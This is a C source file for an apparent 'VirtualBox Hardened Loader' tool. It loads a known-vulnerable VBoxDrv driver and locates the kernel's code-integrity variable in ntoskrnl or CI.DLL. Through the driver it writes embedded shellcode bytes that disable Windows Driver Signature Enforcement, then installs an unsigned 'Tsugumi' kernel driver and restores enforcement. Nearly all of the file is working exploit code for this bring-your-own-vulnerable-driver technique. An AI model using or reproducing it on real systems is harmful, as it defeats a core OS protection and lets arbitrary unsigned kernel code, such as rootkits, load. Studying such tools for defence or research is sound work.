/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.25
*
*  DATE:        08 Nov 2015
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "tsmidrv.h"
#include "dsefix.h"
#include "tables.h"
#include <process.h>

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define CI_DLL			"CI.DLL"

#define TsmiParamsKey	L"Parameters"
#define TsmiPatchData	L"PatchData"
#define TsmiDrvName     L"Tsugumi"
#define VBoxUsbMon		L"VBoxUSBMon"

#define VBoxNetConnect	L"VirtualBox Host-Only Network"
#define T_PROGRAMTITLE	L"VBoxLoader"

#define TSMI_INSTALL 0x00000001
#define TSMI_REMOVE  0x00000002

/*
**  Disable DSE (Vista and above)
**  xor rax, rax
**  ret
*/
const unsigned char scDisable[] = {
	0x48, 0x31, 0xc0, 0xc3
};

/*
**  Enable DSE (W8 and above)
**  xor rax, rax
**  mov al, 6
**  ret
*/
const unsigned char scEnable8Plus[] = {
	0x48, 0x31, 0xc0, 0xb0, 0x06, 0xc3
};

/*
**  Enable DSE (Vista and Seven)
**  xor rax, rax
**  mov al, 1
**  ret
*/
const unsigned char scEnableVista7[] = {
	0x48, 0x31, 0xc0, 0xb0, 0x01, 0xc3
};

//
// Global OS version variable.
//
ULONG					g_TsmiPatchDataValueSize;
PVOID					g_TsmiPatchDataValue;

ULONG_PTR				g_CiVariable = 0L;

RTL_OSVERSIONINFOEXW	g_osv;

//
// Help output.
//
#define T_HELP	L"VirtualBox Hardened Loader v1.2.6000\n\n\r\
loader [-l || -u] [CustomPatchTable]\n\r\
[-l] Install monitoring driver.\n\r\
[-u] Uninstall monitoring driver and purge system cache.\n\r\
[CustomPatchTable] Optional second paramter - table filename with full path.\n\n\r\
Examples:\n\r\
c:\\vbox\\ldr.exe -l\n\r\
c:\\vbox\\ldr.exe -u\n\r\
c:\\vbox\\ldr.exe -l c:\\vbox\\mydata.bin"

/*
* ldrSetTsmiParams
*
* Purpose:
*
* Set patch chains data to the registry.
*
*/
VOID ldrSetTsmiParams(
	VOID
	)
{
	BOOL cond = FALSE;
	HKEY hRootKey, hParamsKey;
	LRESULT lRet;

	hRootKey = NULL;
	hParamsKey = NULL;

	do {
		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\Services\\tsugumi",
			0, KEY_ALL_ACCESS, &hRootKey);

		if ((lRet != ERROR_SUCCESS) || (hRootKey == NULL)) {
			break;
		}

		lRet = RegCreateKey(hRootKey, TsmiParamsKey, &hParamsKey);
		if ((lRet != ERROR_SUCCESS) || (hParamsKey == NULL)) {
			break;
		}

		RegSetValueEx(hParamsKey, TsmiPatchData, 0, REG_BINARY, 
			(LPBYTE)g_TsmiPatchDataValue, g_TsmiPatchDataValueSize);

	} while (cond);

	if (hRootKey) {
		RegCloseKey(hRootKey);
	}
	if (hParamsKey) {
		RegCloseKey(hParamsKey);
	}
}

/*
* ldrSetMonitor
*
* Purpose:
*
* Install Tsugumi monitoring driver.
*
*/
BOOL ldrSetMonitor(
	VOID
	)
{
	BOOL		bResult;
	SC_HANDLE	schSCManager;
	HANDLE		hFile;
	DWORD		bytesIO;
	WCHAR		szDriverBuffer[MAX_PATH * 2];

	bResult = FALSE;

	//
	// Combine full path name for our driver.
	//
	RtlSecureZeroMemory(szDriverBuffer, MAX_PATH * 2);
	if (!GetSystemDirectory(szDriverBuffer, MAX_PATH)) {
		return bResult;
	}
	_strcat(szDriverBuffer, TEXT("\\drivers\\tsugumi.sys"));

	//
	// Drop our driver file to the disk.
	//
	hFile = CreateFile(szDriverBuffer, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return bResult;
	}
	bytesIO = 0;
	WriteFile(hFile, TsmiData, sizeof(TsmiData), &bytesIO, NULL);
	CloseHandle(hFile);

	//
	// Check if file dropped OK.
	//
	if (bytesIO != sizeof(TsmiData)) {
		return bResult;
	}

	//
	// Load Tsugumi device driver.
	//
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager) {

		// Unload any previous versions.
		scmStopDriver(schSCManager, TsmiDrvName);
		scmRemoveDriver(schSCManager, TsmiDrvName);

		// Install and run monitor driver.
		if (scmInstallDriver(schSCManager, TsmiDrvName, szDriverBuffer)) {
			ldrSetTsmiParams();
			bResult = scmStartDriver(schSCManager, TsmiDrvName);
		}

		CloseServiceHandle(schSCManager);
	}

	//
	// Driver file is no longer needed.
	//
	DeleteFile(szDriverBuffer);
	return bResult;
}

/*
* ldrFetchCustomPatchData
*
* Purpose:
*
* Load custom patch table.
* Returned buffer must be freed with HeapFree after usage.
*
*/
PVOID ldrFetchCustomPatchData(
	_In_ LPWSTR lpFileName,
	_Inout_opt_ PDWORD pdwPatchDataSize
	)
{
	HANDLE hFile;
	DWORD dwSize;
	PVOID DataBuffer = NULL;

	//
	// Validate input parameter.
	//
	if (lpFileName == NULL) {
		return NULL;
	}

	//
	// Open file with custom patch table.
	//
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	//
	// Get file size for buffer, allocate it and read data.
	//
	dwSize = GetFileSize(hFile, NULL);
	if (dwSize > 0 && dwSize <= 4096) {

		DataBuffer = (PVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
		if (DataBuffer != NULL) {

			if (ReadFile(hFile, DataBuffer, dwSize, &dwSize, NULL)) {
				
				// Check if optional parameter is set and return data size on true.
				if (pdwPatchDataSize != NULL) {
					*pdwPatchDataSize = dwSize;
				}
			}
		}
	}
	CloseHandle(hFile);
	return DataBuffer;
}

/*
* ldrGetSC
*
* Purpose:
*
* Select OS dependent shellcode.
*
*/
PVOID ldrGetSC(
	BOOL bDisable
	)
{
	PVOID scBuffer = NULL;

	//
	// Select shellcode buffer.
	//
	if (bDisable) {
		scBuffer = (PVOID)scDisable;
	}
	else {

		//Shellcode for for 8/10+
		scBuffer = (PVOID)scEnable8Plus;

		if (g_osv.dwMajorVersion == 6) {

			//Shellcode for vista, 7
			if (g_osv.dwMinorVersion < 2) {
				scBuffer = (PVOID)scEnableVista7;
			}
		}
	}
	return scBuffer;
}

/*
* ldrInit
*
* Purpose:
*
* Initialize loader global variables.
*
*/
BOOL ldrInit(
	DWORD ldrCommand
	)
{
	BOOL		bResult = FALSE, bFound = FALSE, cond = FALSE;
	DWORD		dwSize;
	ULONG		rl = 0, c;
	HKEY		hKey = NULL;
	LRESULT		lRet;
	LONG		rel = 0;
	PVOID		MappedKernel = NULL;
	ULONG_PTR	KernelBase = 0L;
	SIZE_T		ModuleSize;

	PLIST_ENTRY				Head, Next;
	PLDR_DATA_TABLE_ENTRY	Entry;
	PRTL_PROCESS_MODULES	miSpace = NULL;

	CHAR	KernelFullPathName[MAX_PATH * 2];
	TCHAR	szBuffer[MAX_PATH + 1];

	do {

		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox"), 
			0, KEY_READ, &hKey);
	
		//
		// If key not exists, return FALSE and loader will exit.
		//
		if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
			break;
		}

		//
		// If we are not in install mode - leave here.
		//
		if (ldrCommand != TSMI_INSTALL) {
			bResult = TRUE;
			break;
		}

		//
		// Select default patch table.
		//
		g_TsmiPatchDataValue = TsmiPatchDataValue;
		g_TsmiPatchDataValueSize = sizeof(TsmiPatchDataValue);

		//
		// Read VBox version and select proper table.
		//
		RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
		dwSize = MAX_PATH * sizeof(TCHAR);
		lRet = RegQueryValueEx(hKey, TEXT("Version"), NULL, NULL, (LPBYTE)&szBuffer, &dwSize);
		if (lRet != ERROR_SUCCESS) {
			break;
		}

		if (_strcmpi(szBuffer, TEXT("5.0.0")) == 0) {
			g_TsmiPatchDataValue = &TsmiPatchDataValue_500;
			g_TsmiPatchDataValueSize = sizeof(TsmiPatchDataValue_500);
		}
		if (_strcmpi(szBuffer, TEXT("5.0.2")) == 0) {
			g_TsmiPatchDataValue = &TsmiPatchDataValue_502;
			g_TsmiPatchDataValueSize = sizeof(TsmiPatchDataValue_502);
		}

		//
		// Enumerate loaded drivers.
		//
		miSpace = supGetSystemInfo(SystemModuleInformation);
		if (miSpace == NULL) {
			break;
		}
		if (miSpace->NumberOfModules == 0) {
			break;
		}

		//
		// Query system32 folder.
		//
		RtlSecureZeroMemory(KernelFullPathName, sizeof(KernelFullPathName));
		rl = GetSystemDirectoryA(KernelFullPathName, MAX_PATH);
		if (rl == 0) {
			break;
		}
		KernelFullPathName[rl] = (CHAR)'\\';

		//
		// For vista/7 find ntoskrnl.exe
		//
		bFound = FALSE;
		if (g_osv.dwMajorVersion == 6) {
			if (g_osv.dwMinorVersion < 2) {

				_strcpy_a(&KernelFullPathName[rl + 1],
					(const char*)&miSpace->Modules[0].FullPathName[miSpace->Modules[0].OffsetToFileName]);

				KernelBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
				bFound = TRUE;
			}
		}
		//
		// For 8+, 10 find CI.DLL
		//
		if (bFound == FALSE) {
			_strcpy_a(&KernelFullPathName[rl + 1], CI_DLL);
			for (c = 0; c < miSpace->NumberOfModules; c++)
				if (_strcmpi_a((const char *)&miSpace->Modules[c].FullPathName[miSpace->Modules[c].OffsetToFileName],
					CI_DLL) == 0)
				{
					KernelBase = (ULONG_PTR)miSpace->Modules[c].ImageBase;
					break;
				}
		}

		HeapFree(GetProcessHeap(), 0, miSpace);
		miSpace = NULL;

		//
		// Map ntoskrnl/CI.DLL in our address space.
		//
		MappedKernel = LoadLibraryExA(KernelFullPathName, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (MappedKernel == NULL) {
			break;
		}

		if (g_osv.dwMajorVersion == 6) {

			// Find g_CiEnabled Vista, Seven
			if (g_osv.dwMinorVersion < 2) {

				// Query module size via PEB loader for bruteforce.
				ModuleSize = 0;
				EnterCriticalSection((PRTL_CRITICAL_SECTION)NtCurrentPeb()->LoaderLock);
				Head = &NtCurrentPeb()->Ldr->InLoadOrderModuleList;
				Next = Head->Flink;
				while (Next != Head) {
					Entry = CONTAINING_RECORD(Next, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
					if (Entry->DllBase == MappedKernel) {
						ModuleSize = Entry->SizeOfImage;
						break;
					}
					Next = Next->Flink;
				}
				LeaveCriticalSection((PRTL_CRITICAL_SECTION)NtCurrentPeb()->LoaderLock);

				// Module not found, abort.
				if (ModuleSize == 0) {
					break;
				}
				rel = dsfQueryCiEnabled(&KernelBase, MappedKernel, (DWORD)ModuleSize);
			}
			else {

				// Find g_CiOptions w8+ 
				rel = dsfQueryCiOptions(&KernelBase, MappedKernel);
			}
		}
		else {

			// Otherwise > NT6.x, find g_CiOptions 10+
			rel = dsfQueryCiOptions(&KernelBase, MappedKernel);
		}

		if (rel == 0)
			break;

		g_CiVariable = KernelBase;

		bResult = TRUE;

	} while (cond);

	if (hKey) {
		RegCloseKey(hKey);
	}
	if (miSpace != NULL) {
		HeapFree(GetProcessHeap(), 0, miSpace);
	}
	if (MappedKernel != NULL) {
		FreeLibrary(MappedKernel);
	}

	return bResult;
}

/*
* ldrPatchDSE
*
* Purpose:
*
* Manipulate DSE state.
*
*/
BOOL ldrPatchDSE(
	HANDLE hDevice, 
	BOOL bDisable
	)
{
	PVOID scBuffer;

	if ((hDevice == NULL) || (g_CiVariable == 0L)) {
		return FALSE;
	}

	scBuffer = ldrGetSC(bDisable);
	if (scBuffer == NULL) {
		return FALSE;
	}

	return dsfControlDSE(hDevice, g_CiVariable, scBuffer);
}

/*
* ldrMain
*
* Purpose:
*
* Program entry point.
*
*/
void ldrMain(
	VOID
	)
{
	BOOL    cond = FALSE;
	LONG    x;
	ULONG   l = 0, dwCmd;
	HANDLE  hDevice;
	PVOID   DataBuffer;
	BOOL    bConDisabled, bUsbMonDisabled;
	WCHAR   cmdLineParam[MAX_PATH + 1];
	WCHAR   szDriverBuffer[MAX_PATH * 2];

	__security_init_cookie();

	bConDisabled = FALSE;
	bUsbMonDisabled = FALSE;
	DataBuffer = NULL;
	hDevice = NULL;

	dwCmd = 0;
	do {

		//
		// Check OS version.
		//
		RtlSecureZeroMemory(&g_osv, sizeof(g_osv));
		g_osv.dwOSVersionInfoSize = sizeof(g_osv);
		RtlGetVersion((PRTL_OSVERSIONINFOW)&g_osv);

		//
		// We support only Vista based OS.
		//
		if (g_osv.dwMajorVersion < 6) {
			MessageBox(GetDesktopWindow(), TEXT("Unsupported OS."),
				T_PROGRAMTITLE, MB_ICONINFORMATION);
			break;
		}

		//
		// Check number of instances running.
		//
		x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
		if (x > 1) {
			break;
		}

		//
		// Check if any VBox instances are running, they must be closed before our usage.
		//
		if (supProcessExist(L"VirtualBox.exe")) {
			MessageBox(GetDesktopWindow(), TEXT("VirtualBox is running, close it before."),
				T_PROGRAMTITLE, MB_ICONINFORMATION);
			break;
		}

		//
		// Query command line.
		//
		RtlSecureZeroMemory(cmdLineParam, sizeof(cmdLineParam));
		GetCommandLineParam(GetCommandLine(), 1, cmdLineParam, MAX_PATH, &l);
		if (l == 0) {
			//
			// Nothing in command line, simple display help and leave.
			//
			MessageBox(GetDesktopWindow(), T_HELP, T_PROGRAMTITLE, MB_ICONINFORMATION);
			break;
		}

		//
		// Check known command.
		//
		if (_strcmpi(cmdLineParam, TEXT("-l")) == 0) {
			dwCmd = TSMI_INSTALL;
		}
		else {
			if (_strcmpi(cmdLineParam, TEXT("-u")) == 0) {
				dwCmd = TSMI_REMOVE;
			}
		}
		if (dwCmd == 0) {
			MessageBox(GetDesktopWindow(), T_HELP, T_PROGRAMTITLE, MB_ICONINFORMATION);
			break;
		}

		//
		// Init ldr and DSEFix.
		//
		if (!ldrInit(dwCmd)) {
			break;
		}

		//
		// Process command.
		//
		switch (dwCmd) {
			
			case TSMI_INSTALL:

				// Backup vboxdrv if exists.
				supBackupVBoxDrv(FALSE);

				// Stop VBox Networking and USB driver.
				bConDisabled = (SUCCEEDED(supNetworkConnectionEnable(VBoxNetConnect, FALSE)));
				bUsbMonDisabled = dsfStopDriver(VBoxUsbMon);
				dsfStopDriver(VBoxDrvSvc);

				// Load vulnerable VBoxDrv, disable VBox Network if exist.
				RtlSecureZeroMemory(szDriverBuffer, sizeof(szDriverBuffer));
				if (GetSystemDirectory(szDriverBuffer, MAX_PATH) == 0) {
					MessageBox(GetDesktopWindow(), TEXT("Cannot find System32 directory."),
						NULL, MB_ICONINFORMATION);
					break;
				}
				_strcat(szDriverBuffer, TEXT("\\drivers\\VBoxDrv.sys"));
				hDevice = dsfLoadVulnerableDriver(szDriverBuffer);
				if (hDevice) {

					//
					// Disable DSE so we can load monitor.
					// Device handle closed by DSEFix routine.
					//
					if (ldrPatchDSE(hDevice, TRUE)) {

						// Stop our VBoxDrv, need reloading for 2nd usage.
						dsfStopDriver(VBoxDrvSvc);

						// Load custom patch table, if present.
						RtlSecureZeroMemory(cmdLineParam, sizeof(cmdLineParam));
						GetCommandLineParam(GetCommandLine(), 2, cmdLineParam, MAX_PATH, &l);
						if (l > 0) {
							l = 0;
							DataBuffer = ldrFetchCustomPatchData(cmdLineParam, &l);
							if ((DataBuffer != NULL) && (l > 0)) {
								g_TsmiPatchDataValue = DataBuffer;
								g_TsmiPatchDataValueSize = l;
							}
						}

						// Install and run monitor.
						if (!ldrSetMonitor()) {
							MessageBox(GetDesktopWindow(),
								TEXT("Error loading Tsugumi"), NULL, MB_ICONERROR);
						}

						// Enable DSE back.
						hDevice = NULL;
						if (dsfStartDriver(VBoxDrvSvc, &hDevice)) {
							ldrPatchDSE(hDevice, FALSE);
						}

					}
					else { //ldrPatchDSE failure case

						// Unknown error during DSE disabling attempt.
						MessageBox(GetDesktopWindow(),
							TEXT("Error disabling DSE"), NULL, MB_ICONERROR);
					}

					// Finally, remove our vboxdrv file and restore backup.
					dsfStopDriver(VBoxDrvSvc);
					DeleteFile(szDriverBuffer);
					supBackupVBoxDrv(TRUE);

					// Restart installed VBoxDrv.
					dsfStartDriver(VBoxDrvSvc, NULL);

				}
				else { //dsfLoadVulnerableDriver failure case.

					// Load error, show error message and restore backup.
					supBackupVBoxDrv(TRUE);
					MessageBox(GetDesktopWindow(),
						TEXT("Error loading VBoxDrv"), NULL, MB_ICONERROR);
				}	
				break;
				
			//
			// Remove command, unload our driver and purge file/memory list cache.
			//
			case TSMI_REMOVE:
				scmUnloadDeviceDriver(TsmiDrvName);
				supPurgeSystemCache();
				break;

		}

	} while (cond);

	//
	// Cleanup after install.
	//
	if (dwCmd == TSMI_INSTALL) {

		// Re-enable VBox Network, UsbMonitor if they're disabled.
		if (bConDisabled) {
			supNetworkConnectionEnable(VBoxNetConnect, TRUE);
		}
		if (bUsbMonDisabled) {
			dsfStartDriver(VBoxUsbMon, NULL);
		}

		// Free memory allocated for custom patch table.
		if (DataBuffer != NULL) {
			HeapFree(GetProcessHeap(), 0, DataBuffer);
		}
	}

	InterlockedDecrement((PLONG)&g_lApplicationInstances);
	ExitProcess(0);
	return;
}
